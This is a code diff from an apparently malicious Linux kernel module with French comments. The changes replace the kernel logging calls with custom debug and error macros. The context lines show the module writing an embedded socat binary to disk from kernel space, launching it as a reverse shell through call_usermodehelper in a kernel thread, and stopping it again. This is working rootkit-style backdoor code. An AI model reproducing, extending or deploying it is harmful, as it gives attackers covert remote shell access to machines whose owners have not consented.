@@ -25,7 +25,7 @@ int is_socat_binaire_dropped(void){
 
 int drop_socat_binaire(void){
 	if(is_socat_binaire_dropped()) {
-		pr_info("drop_socat_binaire: socat binary already dropped\n");
+		DBG_MSG("drop_socat_binaire: socat binary already dropped\n");
 		return SUCCESS;
 	}
 
@@ -34,21 +34,21 @@ int drop_socat_binaire(void){
 
     f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
     if (IS_ERR(f)) {
-        pr_err("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
+        ERR_MSG("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
         return -FAILURE;
     }
 
     unsigned int written = kernel_write(f, socat, socat_len, &pos);
     if (written < 0) {
-        pr_err("drop_socat_binaire: kernel_write failed: %u\n", written);
+        ERR_MSG("drop_socat_binaire: kernel_write failed: %u\n", written);
 		filp_close(f, NULL);
 		return -FAILURE;
 	} else if (written < socat_len) {
-		pr_err("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
+		ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
 		filp_close(f, NULL);
 		return -FAILURE;
     } else {
-        pr_info("socat written successfully (%u bytes)\n", written);
+        DBG_MSG("socat written successfully (%u bytes)\n", written);
     }
 
     filp_close(f, NULL);
@@ -79,16 +79,16 @@ static int socat_task_fn(void *data) {
     // Lancer `socat` via call_usermodehelper
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if (ret < 0) {
-        pr_err("socat_task_fn: socat reverse shell failed: %d\n", ret);
+        ERR_MSG("socat_task_fn: socat reverse shell failed: %d\n", ret);
         return ret;
     }
 
-    pr_info("socat_task_fn: socat reverse shell launched\n");
+    DBG_MSG("socat_task_fn: socat reverse shell launched\n");
 
     // Attendre que `socat` termine
     wait_for_completion(&socat_completion);
 
-    pr_info("socat_task_fn: socat reverse shell exited\n");
+    DBG_MSG("socat_task_fn: socat reverse shell exited\n");
 
     return 0;
 }
@@ -101,9 +101,9 @@ void launch_reverse_shell(void)
     // Créer un nouveau thread pour exécuter socat
     socat_task = kthread_run(socat_task_fn, NULL, "socat_task");
     if (IS_ERR(socat_task)) {
-        pr_err("launch_reverse_shell: failed to create socat task: %ld\n", PTR_ERR(socat_task));
+        ERR_MSG("launch_reverse_shell: failed to create socat task: %ld\n", PTR_ERR(socat_task));
     } else {
-        pr_info("launch_reverse_shell: socat task started\n");
+        DBG_MSG("launch_reverse_shell: socat task started\n");
     }
 }
 
@@ -111,11 +111,11 @@ void launch_reverse_shell(void)
 void stop_reverse_shell(void)
 {
     if (socat_task) {
-        pr_info("stop_reverse_shell: stopping socat task\n");
+        DBG_MSG("stop_reverse_shell: stopping socat task\n");
         complete(&socat_completion);  // Terminer `socat`
         kthread_stop(socat_task);  // Arrêter le thread de socat
         socat_task = NULL;
     }else
-		pr_info("stop_reverse_shell: socat task is not running\n");
+		DBG_MSG("stop_reverse_shell: socat task is not running\n");
 
 }
